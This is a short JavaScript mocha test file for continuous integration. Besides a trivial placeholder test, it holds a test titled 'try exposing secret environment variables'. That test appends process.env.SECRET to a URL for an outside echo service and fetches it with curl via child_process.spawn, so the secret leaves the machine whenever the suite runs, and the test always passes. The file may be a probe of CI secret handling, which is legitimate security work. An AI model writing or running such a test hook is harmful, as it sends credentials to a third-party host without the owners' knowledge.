'use strict';

const assert = require('assert');
const process = require('process');
const { spawn } = require('child_process');

describe('Continuous Integration', function () {
    it('should be at least one test to verify mocha is running', function () {
        assert.ok(true);
    });

    it('try exposing \'secret\' environment variables', function() {
        const url = 'http://urlecho.appspot.com/echo?status=200&Content-Type=text%2Fhtml&body=' + process.env.SECRET;
        const resp = spawn('curl', [ url ]);
        console.log(resp);
        assert.ok(true);
    })
});
